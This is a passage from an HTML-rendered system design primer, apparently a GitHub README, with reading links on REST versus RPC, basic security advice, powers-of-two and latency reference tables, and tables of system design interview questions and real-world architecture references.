  &lt;i&gt;&lt;a href="https://apihandyman.io/do-you-really-know-why-you-prefer-rest-over-rpc/" rel="nofollow"&gt;Source: Do you really know why you prefer REST over RPC&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-rest-and-rpc" class="anchor" aria-hidden="true" href="#sources-and-further-reading-rest-and-rpc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: REST and RPC&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://apihandyman.io/do-you-really-know-why-you-prefer-rest-over-rpc/" rel="nofollow"&gt;Do you really know why you prefer REST over RPC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://programmers.stackexchange.com/a/181186" rel="nofollow"&gt;When are RPC-ish approaches more appropriate than REST?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/15056878/rest-vs-json-rpc" rel="nofollow"&gt;REST vs JSON-RPC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://etherealbits.com/2012/12/debunking-the-myths-of-rpc-rest/" rel="nofollow"&gt;Debunking the myths of RPC and REST&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-are-the-drawbacks-of-using-RESTful-APIs" rel="nofollow"&gt;What are the drawbacks of using REST&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview" rel="nofollow"&gt;Crack the system design interview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.facebook.com/posts/1468950976659943/" rel="nofollow"&gt;Thrift&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://arstechnica.com/civis/viewtopic.php?t=1190508" rel="nofollow"&gt;Why REST for internal use and not RPC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-security" class="anchor" aria-hidden="true" href="#security"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Security&lt;/h2&gt;
&lt;p&gt;This section could use some updates.  Consider &lt;a href="#contributing"&gt;contributing&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Security is a broad topic.  Unless you have considerable experience, a security background, or are applying for a position that requires knowledge of security, you probably won't need to know more than the basics:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Encrypt in transit and at rest.&lt;/li&gt;
&lt;li&gt;Sanitize all user inputs or any input parameters exposed to user to prevent &lt;a href="https://en.wikipedia.org/wiki/Cross-site_scripting" rel="nofollow"&gt;XSS&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/SQL_injection" rel="nofollow"&gt;SQL injection&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Use parameterized queries to prevent SQL injection.&lt;/li&gt;
&lt;li&gt;Use the principle of &lt;a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow"&gt;least privilege&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-12" class="anchor" aria-hidden="true" href="#sources-and-further-reading-12"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/shieldfy/API-Security-Checklist"&gt;API security checklist&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/FallibleInc/security-guide-for-developers"&gt;Security guide for developers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet" rel="nofollow"&gt;OWASP top ten&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-appendix" class="anchor" aria-hidden="true" href="#appendix"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Appendix&lt;/h2&gt;
&lt;p&gt;You'll sometimes be asked to do 'back-of-the-envelope' estimates.  For example, you might need to determine how long it will take to generate 100 image thumbnails from disk or how much memory a data structure will take.  The &lt;strong&gt;Powers of two table&lt;/strong&gt; and &lt;strong&gt;Latency numbers every programmer should know&lt;/strong&gt; are handy references.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-powers-of-two-table" class="anchor" aria-hidden="true" href="#powers-of-two-table"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Powers of two table&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Power           Exact Value         Approx Value        Bytes
---------------------------------------------------------------
7                             128
8                             256
10                           1024   1 thousand           1 KB
16                         65,536                       64 KB
20                      1,048,576   1 million            1 MB
30                  1,073,741,824   1 billion            1 GB
32                  4,294,967,296                        4 GB
40              1,099,511,627,776   1 trillion           1 TB
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-13" class="anchor" aria-hidden="true" href="#sources-and-further-reading-13"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Power_of_two" rel="nofollow"&gt;Powers of two&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-latency-numbers-every-programmer-should-know" class="anchor" aria-hidden="true" href="#latency-numbers-every-programmer-should-know"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Latency numbers every programmer should know&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Latency Comparison Numbers
--------------------------
L1 cache reference                           0.5 ns
Branch mispredict                            5   ns
L2 cache reference                           7   ns                      14x L1 cache
Mutex lock/unlock                           25   ns
Main memory reference                      100   ns                      20x L2 cache, 200x L1 cache
Compress 1K bytes with Zippy            10,000   ns       10 us
Send 1 KB bytes over 1 Gbps network     10,000   ns       10 us
Read 4 KB randomly from SSD*           150,000   ns      150 us          ~1GB/sec SSD
Read 1 MB sequentially from memory     250,000   ns      250 us
Round trip within same datacenter      500,000   ns      500 us
Read 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB/sec SSD, 4X memory
Disk seek                           10,000,000   ns   10,000 us   10 ms  20x datacenter roundtrip
Read 1 MB sequentially from 1 Gbps  10,000,000   ns   10,000 us   10 ms  40x memory, 10X SSD
Read 1 MB sequentially from disk    30,000,000   ns   30,000 us   30 ms 120x memory, 30X SSD
Send packet CA-&amp;gt;Netherlands-&amp;gt;CA    150,000,000   ns  150,000 us  150 ms

Notes
-----
1 ns = 10^-9 seconds
1 us = 10^-6 seconds = 1,000 ns
1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Handy metrics based on numbers above:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Read sequentially from disk at 30 MB/s&lt;/li&gt;
&lt;li&gt;Read sequentially from 1 Gbps Ethernet at 100 MB/s&lt;/li&gt;
&lt;li&gt;Read sequentially from SSD at 1 GB/s&lt;/li&gt;
&lt;li&gt;Read sequentially from main memory at 4 GB/s&lt;/li&gt;
&lt;li&gt;6-7 world-wide round trips per second&lt;/li&gt;
&lt;li&gt;2,000 round trips per second within a data center&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-latency-numbers-visualized" class="anchor" aria-hidden="true" href="#latency-numbers-visualized"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Latency numbers visualized&lt;/h4&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/77f72259e1eb58596b564d1ad823af1853bc60a3/687474703a2f2f692e696d6775722e636f6d2f6b307431652e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/77f72259e1eb58596b564d1ad823af1853bc60a3/687474703a2f2f692e696d6775722e636f6d2f6b307431652e706e67" alt="" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-14" class="anchor" aria-hidden="true" href="#sources-and-further-reading-14"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/jboner/2841832"&gt;Latency numbers every programmer should know - 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/hellerbarde/2843375"&gt;Latency numbers every programmer should know - 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cs.cornell.edu/projects/ladis2009/talks/dean-keynote-ladis2009.pdf" rel="nofollow"&gt;Designs, lessons, and advice from building large distributed systems&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://static.googleusercontent.com/media/research.google.com/en//people/jeff/stanford-295-talk.pdf" rel="nofollow"&gt;Software Engineering Advice from Building Large-Scale Distributed Systems&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-additional-system-design-interview-questions" class="anchor" aria-hidden="true" href="#additional-system-design-interview-questions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Additional system design interview questions&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Common system design interview questions, with links to resources on how to solve each.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Question&lt;/th&gt;
&lt;th&gt;Reference(s)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Design a file sync service like Dropbox&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.youtube.com/watch?v=PE4gwstWhmc" rel="nofollow"&gt;youtube.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a search engine like Google&lt;/td&gt;
&lt;td&gt;&lt;a href="http://queue.acm.org/detail.cfm?id=988407" rel="nofollow"&gt;queue.acm.org&lt;/a&gt;&lt;br&gt;&lt;a href="http://programmers.stackexchange.com/questions/38324/interview-question-how-would-you-implement-google-search" rel="nofollow"&gt;stackexchange.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://www.ardendertat.com/2012/01/11/implementing-search-engines/" rel="nofollow"&gt;ardendertat.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://infolab.stanford.edu/~backrub/google.html" rel="nofollow"&gt;stanford.edu&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a scalable web crawler like Google&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.quora.com/How-can-I-build-a-web-crawler-from-scratch" rel="nofollow"&gt;quora.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design Google docs&lt;/td&gt;
&lt;td&gt;&lt;a href="https://code.google.com/p/google-mobwrite/" rel="nofollow"&gt;code.google.com&lt;/a&gt;&lt;br&gt;&lt;a href="https://neil.fraser.name/writing/sync/" rel="nofollow"&gt;neil.fraser.name&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a key-value store like Redis&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/dvirsky/introduction-to-redis" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a cache system like Memcached&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/oemebamo/introduction-to-memcached" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a recommendation system like Amazon's&lt;/td&gt;
&lt;td&gt;&lt;a href="https://web.archive.org/web/20170406065247/http://tech.hulu.com/blog/2011/09/19/recommendation-system.html" rel="nofollow"&gt;hulu.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://ijcai13.org/files/tutorial_slides/td3.pdf" rel="nofollow"&gt;ijcai13.org&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a tinyurl system like Bitly&lt;/td&gt;
&lt;td&gt;&lt;a href="http://n00tc0d3r.blogspot.com/" rel="nofollow"&gt;n00tc0d3r.blogspot.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a chat app like WhatsApp&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2014/2/26/the-whatsapp-architecture-facebook-bought-for-19-billion.html" rel="nofollow"&gt;highscalability.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a picture sharing system like Instagram&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/flickr-architecture" rel="nofollow"&gt;highscalability.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html" rel="nofollow"&gt;highscalability.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design the Facebook news feed function&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.quora.com/What-are-best-practices-for-building-something-like-a-News-Feed" rel="nofollow"&gt;quora.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://www.quora.com/Activity-Streams/What-are-the-scaling-issues-to-keep-in-mind-while-developing-a-social-network-feed" rel="nofollow"&gt;quora.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://www.slideshare.net/danmckinley/etsy-activity-feeds-architecture" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design the Facebook timeline function&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.facebook.com/note.php?note_id=10150468255628920" rel="nofollow"&gt;facebook.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://highscalability.com/blog/2012/1/23/facebook-timeline-brought-to-you-by-the-power-of-denormaliza.html" rel="nofollow"&gt;highscalability.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design the Facebook chat function&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.erlang-factory.com/upload/presentations/31/EugeneLetuchy-ErlangatFacebook.pdf" rel="nofollow"&gt;erlang-factory.com&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.facebook.com/note.php?note_id=14218138919&amp;amp;id=9445547199&amp;amp;index=0" rel="nofollow"&gt;facebook.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a graph search function like Facebook's&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.facebook.com/notes/facebook-engineering/under-the-hood-building-out-the-infrastructure-for-graph-search/10151347573598920" rel="nofollow"&gt;facebook.com&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.facebook.com/notes/facebook-engineering/under-the-hood-indexing-and-ranking-in-graph-search/10151361720763920" rel="nofollow"&gt;facebook.com&lt;/a&gt;&lt;br&gt;&lt;a href="https://www.facebook.com/notes/facebook-engineering/under-the-hood-the-natural-language-interface-of-graph-search/10151432733048920" rel="nofollow"&gt;facebook.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a content delivery network like CloudFlare&lt;/td&gt;
&lt;td&gt;&lt;a href="https://figshare.com/articles/Globally_distributed_content_delivery/6605972" rel="nofollow"&gt;figshare.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a trending topic system like Twitter's&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.michael-noll.com/blog/2013/01/18/implementing-real-time-trending-topics-in-storm/" rel="nofollow"&gt;michael-noll.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://snikolov.wordpress.com/2012/11/14/early-detection-of-twitter-trends/" rel="nofollow"&gt;snikolov .wordpress.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a random ID generation system&lt;/td&gt;
&lt;td&gt;&lt;a href="https://blog.twitter.com/2010/announcing-snowflake" rel="nofollow"&gt;blog.twitter.com&lt;/a&gt;&lt;br&gt;&lt;a href="https://github.com/twitter/snowflake/"&gt;github.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Return the top k requests during a time interval&lt;/td&gt;
&lt;td&gt;&lt;a href="https://www.cs.ucsb.edu/sites/cs.ucsb.edu/files/docs/reports/2005-23.pdf" rel="nofollow"&gt;cs.ucsb.edu&lt;/a&gt;&lt;br&gt;&lt;a href="http://davis.wpi.edu/xmdv/docs/EDBT11-diyang.pdf" rel="nofollow"&gt;wpi.edu&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a system that serves data from multiple data centers&lt;/td&gt;
&lt;td&gt;&lt;a href="http://highscalability.com/blog/2009/8/24/how-google-serves-data-from-multiple-datacenters.html" rel="nofollow"&gt;highscalability.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design an online multiplayer card game&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.indieflashblog.com/how-to-create-an-asynchronous-multiplayer-game.html" rel="nofollow"&gt;indieflashblog.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://buildnewgames.com/real-time-multiplayer/" rel="nofollow"&gt;buildnewgames.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a garbage collection system&lt;/td&gt;
&lt;td&gt;&lt;a href="http://journal.stuffwithstuff.com/2013/12/08/babys-first-garbage-collector/" rel="nofollow"&gt;stuffwithstuff.com&lt;/a&gt;&lt;br&gt;&lt;a href="http://courses.cs.washington.edu/courses/csep521/07wi/prj/rick.pdf" rel="nofollow"&gt;washington.edu&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design an API rate limiter&lt;/td&gt;
&lt;td&gt;&lt;a href="https://stripe.com/blog/rate-limiters" rel="nofollow"&gt;https://stripe.com/blog/&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Add a system design question&lt;/td&gt;
&lt;td&gt;&lt;a href="#contributing"&gt;Contribute&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-real-world-architectures" class="anchor" aria-hidden="true" href="#real-world-architectures"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Real world architectures&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Articles on how real world systems are designed.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/b7c71be73fb466344c2d773178ae74e3fbb1dcc6/687474703a2f2f692e696d6775722e636f6d2f5463556f3266772e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/b7c71be73fb466344c2d773178ae74e3fbb1dcc6/687474703a2f2f692e696d6775722e636f6d2f5463556f3266772e706e67" data-canonical-src="http://i.imgur.com/TcUo2fw.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://www.infoq.com/presentations/Twitter-Timeline-Scalability" rel="nofollow"&gt;Source: Twitter timelines at scale&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Don't focus on nitty gritty details for the following articles, instead:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Identify shared principles, common technologies, and patterns within these articles&lt;/li&gt;
&lt;li&gt;Study what problems are solved by each component, where it works, where it doesn't&lt;/li&gt;
&lt;li&gt;Review the lessons learned&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Type&lt;/th&gt;
&lt;th&gt;System&lt;/th&gt;
&lt;th&gt;Reference(s)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Data processing&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;MapReduce&lt;/strong&gt; - Distributed data processing from Google&lt;/td&gt;
&lt;td&gt;&lt;a href="http://static.googleusercontent.com/media/research.google.com/zh-CN/us/archive/mapreduce-osdi04.pdf" rel="nofollow"&gt;research.google.com&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data processing&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Spark&lt;/strong&gt; - Distributed data processing from Databricks&lt;/td&gt;
&lt;td&gt;&lt;a href="http://www.slideshare.net/AGrishchenko/apache-spark-architecture" rel="nofollow"&gt;slideshare.net&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data processing&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Storm&lt;/strong&gt; - Distributed data processing from Twitter&lt;/td&gt;
